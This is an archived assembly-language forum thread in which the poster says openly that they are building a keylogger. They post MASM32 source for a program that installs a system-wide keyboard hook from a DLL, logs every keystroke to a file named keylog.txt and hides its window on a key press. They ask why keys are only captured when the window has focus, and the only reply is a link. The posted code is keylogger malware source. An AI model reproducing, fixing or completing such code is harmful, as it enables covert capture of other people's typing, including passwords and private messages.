<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8" />
  <title>System-wide hook - Forums - ASM Community</title>
  <link rel="stylesheet" type="text/css" href="../../../style.css" />
  <link rel="canonical" href="../?id=19670" />
     </head>
 <body>
  <div id="header">
   <h1><a href="../../../">ASM Community</a></h1>
  </div>
  <div id="content">
   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=3">MAIN</a> &raquo; <a href="../?id=19670">System-wide hook</a></p>
   <div class="post" id="post-151297">
    <div class="subject"><a href="#post-151297">System-wide hook</a></div>
    <div class="body">Hey there, ive recently been trying to build myself a keylogger, and have a system-wide hook proc in a dll, but for some reason my program only receives messages when a key is pushed IF the window has the focus, which kind of defeats the purpose of a system-wide hook.<br /><br />Program code (built on GENERIC.ASM)<br /><pre><code><br />; #########################################################################<br />;<br />;             GENERIC.ASM is a roadmap around a standard 32 bit <br />;              windows application skeleton written in MASM32.<br />;<br />; #########################################################################<br /><br />;           Assembler specific instructions for 32 bit ASM code<br /><br />      .386                   ; minimum processor needed for 32 bit<br />      .model flat, stdcall   ; FLAT memory model &amp; STDCALL calling<br />      option casemap &#58;none   ; set code to case sensitive<br /><br />; #########################################################################<br /><br />      ; -- -------------------------------------------<br />      ; main include file with equates and structures<br />      ; ---------------------------------------------<br />      include \masm32\include\windows.inc<br /><br />      ; -------------------------------------------------------------<br />      ; In MASM32, each include file created by the L2INC.EXE utility<br />      ; has a matching library file. If you need functions from a<br />      ; specific library, you use BOTH the include file and library<br />      ; file for that library.<br />      ; -------------------------------------------------------------<br /><br />      include \masm32\include\user32.inc<br />      include \masm32\include\kernel32.inc<br />      include nofrillz.inc<br /><br />      includelib \masm32\lib\user32.lib<br />      includelib \masm32\lib\kernel32.lib<br />      includelib nofrillz.lib<br /><br />; #########################################################################<br /><br />; ------------------------------------------------------------------------<br />; MACROS are a method of expanding text at assembly time. This allows the<br />; programmer a tidy and convenient way of using COMMON blocks of code with<br />; the capacity to use DIFFERENT parameters in each block.<br />; ------------------------------------------------------------------------<br /><br />      ; 1. szText<br />      ; A macro to insert TEXT into the code section for convenient and <br />      ; more intuitive coding of functions that use byte data as text.<br /><br />      szText MACRO Name, Text&#58;VARARG<br />        LOCAL lbl<br />          jmp lbl<br />            Name db Text,0<br />          lbl&#58;<br />        ENDM<br /><br />      ; 2. m2m<br />      ; There is no mnemonic to copy from one memory location to another,<br />      ; this macro saves repeated coding of this process and is easier to<br />      ; read in complex code.<br /><br />      m2m MACRO M1, M2<br />        push M2<br />        pop  M1<br />      ENDM<br /><br />      ; 3. return<br />      ; Every procedure MUST have a &quot;ret&quot; to return the instruction<br />      ; pointer EIP back to the next instruction after the call that<br />      ; branched to it. This macro puts a return value in eax and<br />      ; makes the &quot;ret&quot; instruction on one line. It is mainly used<br />      ; for clear coding in complex conditionals in large branching<br />      ; code such as the WndProc procedure.<br /><br />      return MACRO arg<br />        mov eax, arg<br />        ret<br />      ENDM<br /><br />; #########################################################################<br /><br />; ----------------------------------------------------------------------<br />; Prototypes are used in conjunction with the MASM &quot;invoke&quot; syntax for<br />; checking the number and size of parameters passed to a procedure. This<br />; improves the reliability of code that is written where errors in<br />; parameters are caught and displayed at assembly time.<br />; ----------------------------------------------------------------------<br /><br />        WinMain PROTO &#58;DWORD,&#58;DWORD,&#58;DWORD,&#58;DWORD<br />        WndProc PROTO &#58;DWORD,&#58;DWORD,&#58;DWORD,&#58;DWORD<br />        TopXY PROTO   &#58;DWORD,&#58;DWORD<br /><br />; #########################################################################<br /><br />; ------------------------------------------------------------------------<br />; This is the INITIALISED data section meaning that data declared here has<br />; an initial value. You can also use an UNINIALISED section if you need<br />; data of that type &#91; .data? &#93;. Note that they are different and occur in<br />; different sections.<br />; ------------------------------------------------------------------------<br />.const<br />WM_KEY equ WM_USER+8<br /><br />    .data<br />        szDisplayName db &quot;Generic&quot;,0<br />        CommandLine   dd 0<br />        hWnd          dd 0<br />        hInstance     dd 0<br />	buffer db &quot;keylog.txt&quot;,0<br /><br />    .data?<br />pot dd ?<br />buff dd 4086 dup &#40;?&#41;<br />hFile dd ?<br />SizeReadWrite dd ?<br /><br />; #########################################################################<br /><br />; ------------------------------------------------------------------------<br />; This is the start of the code section where executable code begins. This<br />; section ending with the ExitProcess&#40;&#41; API function call is the only<br />; GLOBAL section of code and it provides access to the WinMain function<br />; with the necessary parameters, the instance handle and the command line<br />; address.<br />; ------------------------------------------------------------------------<br /><br />    .code<br /><br />; -----------------------------------------------------------------------<br />; The label &quot;start&#58;&quot; is the address of the start of the code section and<br />; it has a matching &quot;end start&quot; at the end of the file. All procedures in<br />; this module must be written between these two.<br />; -----------------------------------------------------------------------<br /><br />start&#58;<br />    invoke GetModuleHandle, NULL ; provides the instance handle<br />    mov hInstance, eax<br /><br />    invoke GetCommandLine        ; provides the command line address<br />    mov CommandLine, eax<br /><br />    invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT<br />    <br />    invoke ExitProcess,eax       ; cleanup &amp; return to operating system<br /><br />; #########################################################################<br /><br />WinMain proc hInst     &#58;DWORD,<br />             hPrevInst &#58;DWORD,<br />             CmdLine   &#58;DWORD,<br />             CmdShow   &#58;DWORD<br /><br />        ;====================<br />        ; Put LOCALs on stack<br />        ;====================<br /><br />        LOCAL wc   &#58;WNDCLASSEX<br />        LOCAL msg  &#58;MSG<br /><br />        LOCAL Wwd  &#58;DWORD<br />        LOCAL Wht  &#58;DWORD<br />        LOCAL Wtx  &#58;DWORD<br />        LOCAL Wty  &#58;DWORD<br /><br />        szText szClassName,&quot;Generic_Class&quot;<br /><br />        ;==================================================<br />        ; Fill WNDCLASSEX structure with required variables<br />        ;==================================================<br /><br />        mov wc.cbSize,         sizeof WNDCLASSEX<br />        mov wc.style,          CS_HREDRAW or CS_VREDRAW \<br />                               or CS_BYTEALIGNWINDOW<br />        mov wc.lpfnWndProc,    offset WndProc      ; address of WndProc<br />        mov wc.cbClsExtra,     NULL<br />        mov wc.cbWndExtra,     NULL<br />        m2m wc.hInstance,      hInst               ; instance handle<br />        mov wc.hbrBackground,  COLOR_BTNFACE+1     ; system color<br />        mov wc.lpszMenuName,   NULL<br />        mov wc.lpszClassName,  offset szClassName  ; window class name<br />          invoke LoadIcon,hInst,500    ; icon ID   ; resource icon<br />        mov wc.hIcon,          eax<br />          invoke LoadCursor,NULL,IDC_ARROW         ; system cursor<br />        mov wc.hCursor,        eax<br />        mov wc.hIconSm,        0<br /><br />        invoke RegisterClassEx, ADDR wc     ; register the window class<br /><br />        ;================================<br />        ; Centre window at following size<br />        ;================================<br /><br />        mov Wwd, 500<br />        mov Wht, 350<br /><br />        invoke GetSystemMetrics,SM_CXSCREEN ; get screen width in pixels<br />        invoke TopXY,Wwd,eax<br />        mov Wtx, eax<br /><br />        invoke GetSystemMetrics,SM_CYSCREEN ; get screen height in pixels<br />        invoke TopXY,Wht,eax<br />        mov Wty, eax<br /><br />        ; ==================================<br />        ; Create the main application window<br />        ; ==================================<br />        invoke CreateWindowEx,WS_EX_OVERLAPPEDWINDOW,<br />                              ADDR szClassName,<br />                              ADDR szDisplayName,<br />                              WS_OVERLAPPEDWINDOW,<br />                              Wtx,Wty,Wwd,Wht,<br />                              NULL,NULL,<br />                              hInst,NULL<br /><br />        mov   hWnd,eax  ; copy return value into handle DWORD<br /><br />        invoke LoadMenu,hInst,600                 ; load resource menu<br />        invoke SetMenu,hWnd,eax                   ; set it to main window<br /><br />        invoke ShowWindow,hWnd,SW_SHOWNORMAL      ; display the window<br />        invoke UpdateWindow,hWnd                  ; update the display<br /><br />      ;===================================<br />      ; Loop until PostQuitMessage is sent<br />      ;===================================<br /><br />    StartLoop&#58;<br />      invoke GetMessage,ADDR msg,NULL,0,0         ; get each message<br />      cmp eax, 0                                  ; exit if GetMessage&#40;&#41;<br />      je ExitLoop                                 ; returns zero<br />      invoke TranslateMessage, ADDR msg           ; translate it<br />      invoke DispatchMessage,  ADDR msg           ; send it to message proc<br />      jmp StartLoop<br />    ExitLoop&#58;<br /><br />      return msg.wParam<br /><br />WinMain endp<br /><br />; #########################################################################<br /><br />WndProc proc hWin   &#58;DWORD,<br />             uMsg   &#58;DWORD,<br />             wParam &#58;DWORD,<br />             lParam &#58;DWORD<br /><br />; -------------------------------------------------------------------------<br />; Message are sent by the operating system to an application through the<br />; WndProc proc. Each message can have additional values associated with it<br />; in the two parameters, wParam &amp; lParam. The range of additional data that<br />; can be passed to an application is determined by the message.<br />; -------------------------------------------------------------------------<br /><br />    .if uMsg == WM_COMMAND<br />    ;----------------------------------------------------------------------<br />    ; The WM_COMMAND message is sent by menus, buttons and toolbar buttons.<br />    ; Processing the wParam parameter of it is the method of obtaining the<br />    ; control's ID number so that the code for each operation can be<br />    ; processed. NOTE that the ID number is in the LOWORD of the wParam<br />    ; passed with the WM_COMMAND message. There may be some instances where<br />    ; an application needs to seperate the high and low words of wParam.<br />    ; ---------------------------------------------------------------------<br />    <br />    ;======== menu commands ========<br /><br />        .if wParam == 1000<br />            invoke SendMessage,hWin,WM_SYSCOMMAND,SC_CLOSE,NULL<br />        .elseif wParam == 1900<br />            szText TheMsg,&quot;Assembler, Pure &amp; Simple&quot;<br />            invoke MessageBox,hWin,ADDR TheMsg,ADDR szDisplayName,MB_OK<br />        .endif<br /><br />    ;====== end menu commands ======<br /><br />    .elseif uMsg == WM_CREATE<br />invoke StartLog,hWin,WM_KEY<br />invoke CreateFile,ADDR buffer,\ <br />                                                GENERIC_READ or GENERIC_WRITE ,\ <br />                                                FILE_SHARE_READ or FILE_SHARE_WRITE,\ <br />                                                NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_ARCHIVE,\ <br />                                                NULL <br />                        mov hFile,eax <br />mov pot,offset buff<br />    ; --------------------------------------------------------------------<br />    ; This message is sent to WndProc during the CreateWindowEx function<br />    ; call and is processed before it returns. This is used as a position<br />    ; to start other items such as controls. IMPORTANT, the handle for the<br />    ; CreateWindowEx call in the WinMain does not yet exist so the HANDLE<br />    ; passed to the WndProc &#91; hWin &#93; must be used here for any controls<br />    ; or child windows.<br />    ; --------------------------------------------------------------------<br /><br />    .elseif uMsg == WM_KEY<br />                        invoke WriteFile,hFile,addr wParam,4,ADDR SizeReadWrite,NULL<br />.if wParam == &quot;H&quot;<br />invoke SetWindowPos,hWin,HWND_TOPMOST,0,0,100,100,SWP_HIDEWINDOW<br />;invoke ShowWindow,hWin,SW_HIDE<br />.endif<br />;.if wParam == &quot;S&quot;<br />;invoke ShowWindow,hWin,SW_SHOW<br />;.endif<br /><br />neee&#58;<br />    .elseif uMsg == WM_CLOSE<br />    ; -------------------------------------------------------------------<br />    ; This is the place where various requirements are performed before<br />    ; the application exits to the operating system such as deleting<br />    ; resources and testing if files have been saved. You have the option<br />    ; of returning ZERO if you don't wish the application to close which<br />    ; exits the WndProc procedure without passing this message to the<br />    ; default window processing done by the operating system.<br />    ; -------------------------------------------------------------------<br />    invoke EndLog<br />                            invoke CloseHandle,hFile<br />.elseif uMsg == WM_DESTROY<br />    ; ----------------------------------------------------------------<br />    ; This message MUST be processed to cleanly exit the application.<br />    ; Calling the PostQuitMessage&#40;&#41; function makes the GetMessage&#40;&#41;<br />    ; function in the WinMain&#40;&#41; main loop return ZERO which exits the<br />    ; application correctly. If this message is not processed properly<br />    ; the window disappears but the code is left in memory.<br />    ; ----------------------------------------------------------------<br />        invoke PostQuitMessage,NULL<br />        return 0 <br />    .endif<br /><br />    invoke DefWindowProc,hWin,uMsg,wParam,lParam<br />    ; --------------------------------------------------------------------<br />    ; Default window processing is done by the operating system for any<br />    ; message that is not processed by the application in the WndProc<br />    ; procedure. If the application requires other than default processing<br />    ; it executes the code when the message is trapped and returns ZERO<br />    ; to exit the WndProc procedure before the default window processing<br />    ; occurs with the call to DefWindowProc&#40;&#41;.<br />    ; --------------------------------------------------------------------<br /><br />    ret<br /><br />WndProc endp<br /><br />; ########################################################################<br /><br />TopXY proc wDim&#58;DWORD, sDim&#58;DWORD<br /><br />    ; ----------------------------------------------------<br />    ; This procedure calculates the top X &amp; Y co-ordinates<br />    ; for the CreateWindowEx call in the WinMain procedure<br />    ; ----------------------------------------------------<br /><br />    shr sDim, 1      ; divide screen dimension by 2<br />    shr wDim, 1      ; divide window dimension by 2<br />    mov eax, wDim    ; copy window dimension into eax<br />    sub sDim, eax    ; sub half win dimension from half screen dimension<br /><br />    return sDim<br /><br />TopXY endp<br /><br />; ########################################################################<br /><br />end start<br /><br /></code></pre><br /><br /><br />DLL proc:<br /><br /><pre><code><br />KeyProc proc nCode&#58;DWORD,wParam&#58;DWORD,lParam&#58;DWORD<br />	cmp nCode,HC_ACTION<br />	je nx<br />	invoke CallNextHookEx,hHook,nCode,wParam,lParam<br />	nx&#58;<br />	invoke PostMessage,hWnd,mgnm,wParam,lParam<br />	;.if wParam==&quot;S&quot;<br />	;invoke PostMessage,hWnd,WM_CLOSE,wParam,lParam<br />	;.endif<br />	xor eax,eax<br />	ret<br />KeyProc endp<br /><br />StartLog proc hwnd&#58;DWORD, msgnme&#58;DWORD<br />	push hwnd<br />	pop hWnd<br />	push msgnme<br />	pop mgnm<br />	invoke SetWindowsHookEx,WH_KEYBOARD,addr KeyProc,hInstance,0<br />	mov hHook,eax<br />	ret <br />StartLog endp<br /><br />EndLog proc<br />	invoke UnhookWindowsHookEx,hHook<br />	ret<br />EndLog endp<br /></code></pre></div>
    <div class="meta">Posted on 2004-10-15 04:21:31 by nofrillz</div>
   </div>
   <div class="post" id="post-151336">
    <div class="subject"><a href="#post-151336">System-wide hook</a></div>
    <div class="body">http://www.asmcommunity.net/board/viewtopic.php?t=7643</div>
    <div class="meta">Posted on 2004-10-16 09:25:17 by Four-F</div>
   </div>
  </div>
 </body>
</html>